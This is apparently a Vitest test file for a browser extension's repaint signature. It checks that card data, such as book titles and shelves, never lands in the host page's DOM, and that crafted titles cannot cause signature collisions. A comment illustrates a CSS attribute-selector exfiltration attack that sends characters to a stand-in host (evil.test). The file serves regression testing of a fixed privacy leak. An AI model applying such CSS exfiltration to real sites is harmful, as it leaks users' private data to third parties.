import { describe, it, expect } from 'vitest';
import { signature } from './cardSignature';
import type { Card } from './catchTray';
import CONTENT_SRC from './content.ts?raw';

/**
 * TM-9. `OPENWORK.md` item 52.
 *
 * `content.ts` wrote this string into `el.dataset['sig']` — **an attribute on an element
 * living in x.com's own light DOM.** Read what the string contains:
 *
 *     state | text | source | image | title/coverUrl/shelvedIn/savedTo, per book
 *
 * **That is the titles of the books you are reading and which pile each one is in**, sitting
 * on somebody else's page. And it does not take a script to get it out: CSS attribute
 * selectors do it alone.
 *
 *     [data-sig^="a"]  { background: url(https://evil.test/a) }
 *     [data-sig^="b"]  { background: url(https://evil.test/b) }
 *
 * One rule per candidate prefix, and the page reads the value a character at a time from
 * its own request log. No JavaScript, so no CSP rule and no `isTrusted` check touches it.
 *
 * **The string never needed to be in the DOM at all.** Its only reader is a repaint check —
 * *has this card changed since I drew it?* — and `paintTray` already keeps a record per card
 * in `drawn`. The value belongs there, where the host page cannot address it.
 */

const card = (over: Partial<Card> = {}): Card => ({
  id: 1,
  job: 'j1',
  state: 'found',
  text: '',
  candidates: [
    { book: { title: 'Dune', author: 'Frank Herbert', coverUrl: 'https://c.test/d.jpg' } },
  ],
  pictures: 1,
  transient: false,
  openedAt: 0,
  ...over,
});

describe('the repaint signature', () => {
  it('is stable for a card that has not changed', () => {
    expect(signature(card())).toBe(signature(card()));
  });

  /**
   * EVERY FIELD THE DOM DEPENDS ON, and the test is written as a loop for a reason: a
   * signature that misses a field is a card that never repaints when that field changes,
   * which is a stale answer left on screen.
   */
  it('changes when anything the card shows changes', () => {
    const base = signature(card());

    const variants: Partial<Card>[] = [
      { state: 'wall' },
      { text: 'Reading the cover…' },
      { source: 'vision' },
      { image: 'https://pbs.twimg.com/media/a.jpg' },
      { candidates: [{ book: { title: 'Emma', author: 'Jane Austen' } }] },
      {
        candidates: [
          { book: { title: 'Dune', author: 'Frank Herbert', coverUrl: 'https://c.test/OTHER.jpg' } },
        ],
      },
      {
        candidates: [
          {
            book: { title: 'Dune', author: 'Frank Herbert', coverUrl: 'https://c.test/d.jpg' },
            shelvedIn: 'now',
          },
        ],
      },
      {
        candidates: [
          {
            book: { title: 'Dune', author: 'Frank Herbert', coverUrl: 'https://c.test/d.jpg' },
            savedTo: 'someday',
          },
        ],
      },
    ];

    for (const over of variants) {
      expect(signature(card(over)), JSON.stringify(over)).not.toBe(base);
    }
  });

  it('does not confuse two books with one book whose title spells the separators', () => {
    /**
     * ⚠ **THE FIRST VERSION OF THIS TEST USED `'A,B'` AND PROVED NOTHING**, because that is
     * not a collision — a mutation restoring the old join survived it. The old scheme was
     *
     *     `${title}/${coverUrl}/${shelvedIn}/${savedTo}`   joined by `,`
     *
     * so the colliding title has to spell BOTH separators. Derived by running the old
     * function rather than guessed:
     *
     *     two books "A" and "B"      -> "found||||A///,B///"
     *     one book "A///,B"          -> "found||||A///,B///"
     *
     * **A title is the one part of this string an attacker chooses** — it comes back from a
     * model reading a photograph they posted. A collision means the card stops repainting:
     * a stale answer left on screen, on the surface the product is named for.
     *
     * `JSON.stringify` cannot collide, because the separators are escaped inside the values.
     */
    const two = signature(
      card({
        candidates: [
          { book: { title: 'A', author: '' } },
          { book: { title: 'B', author: '' } },
        ],
      }),
    );
    const one = signature(card({ candidates: [{ book: { title: 'A///,B', author: '' } }] }));

    expect(two).not.toBe(one);
  });

  it('does not let a message spell its way into another field', () => {
    // The outer join was `|`. A text of "a|link" and a source of nothing produced the same
    // string as a text of "a" with source "link". Not attacker-reachable today — every
    // message is ours — but it is the same defect one field along, and JSON closes both.
    const spelled = signature(card({ state: 'found', text: 'a|link', candidates: [] }));
    const split = signature(card({ state: 'found', text: 'a', source: 'link', candidates: [] }));

    expect(spelled).not.toBe(split);
  });
});

/**
 * THE ABSENCE PROOF, and it is the half that matters.
 *
 * *"The signature is kept in a Map"* is satisfied by keeping it in a Map **and** writing it
 * to the DOM as well. What has to be true is that **no card-derived value reaches
 * `dataset` at all** — which is a statement about every write in the file, not about the
 * one that had the bug. Same shape as `contentSafety.test.ts`: there is no second way in.
 */
describe('no card state reaches the host page’s DOM', () => {
  const code = CONTENT_SRC.replace(/\/\*[\s\S]*?\*\//g, '').replace(/\/\/.*$/gm, '');

  it('never writes the signature into an attribute', () => {
    expect(code).not.toMatch(/dataset\[[^\]]*\]\s*=\s*signature/);
    expect(code).not.toContain("dataset['sig']");
  });

  it('assigns only CONSTANTS to dataset, never a computed value', () => {
    // The general rule rather than the specific bug. `data-book` is a presence flag the
    // stylesheet reads — one bit, and a class would expose exactly the same bit — so the
    // ban is on VALUES that carry content, which is every right-hand side that is not a
    // literal.
    const writes = [...code.matchAll(/\.dataset\[[^\]]*\]\s*=\s*([^;]+);/g)].map((m) =>
      (m[1] ?? '').trim(),
    );

    expect(writes.length, 'no dataset writes found — has the pattern changed?').toBeGreaterThan(0);
    for (const value of writes) {
      expect(value, `dataset assigned a computed value: ${value}`).toMatch(/^(''|""|`\s*`)$/);
    }
  });
});
